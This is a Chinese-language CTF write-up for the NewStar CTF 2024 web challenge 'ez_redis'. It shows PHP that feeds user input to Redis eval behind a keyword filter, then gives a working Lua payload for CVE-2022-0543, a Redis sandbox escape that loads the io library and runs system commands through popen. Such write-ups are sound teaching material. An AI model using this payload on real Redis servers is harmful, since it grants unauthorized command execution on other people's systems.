# ez_redis

> 分类：Web

## 题目描述
考 Redis 命令执行及其历史漏洞。有源码泄露（`/www.zip`）。后端用 phpredis 执行 `$example->eval($cmd)`，但过滤了 `set` 和 `php`，无法通过写 webshell、计划任务、主从复制 getshell，需利用 Redis 5 历史漏洞 CVE-2022-0543。

## 考察知识点
- Redis 语法与命令执行
- CVE-2022-0543（Redis Lua 沙盒绕过）
- `package.loadlib` 加载 io 库执行系统命令

## 解法
关键代码：
```php
if(isset($_POST['eval'])){
    $cmd = $_POST['eval'];
    if(preg_match("/set|php/i", $cmd))
    {
        $cmd = 'return "u are not newstar";';
    }
    $example = new Redis();
    $example->connect($REDIS_HOST);
    $result = json_encode($example->eval($cmd));
    echo '<h1 class="subtitle">结果</h1>';
    echo "<pre>$result</pre>";
}
```
由于过滤 `set`、`php`，写 webshell、计划任务、主从复制都不行。利用 Redis 5 的 CVE-2022-0543（Lua 沙盒绕过），网站执行的是 redis 命令，所以去掉外层 `eval`：

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res
```

把 `id` 换成读取 flag 的命令即可拿到 flag。

## 参考答案
（见截图）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/web/ez_redis.html
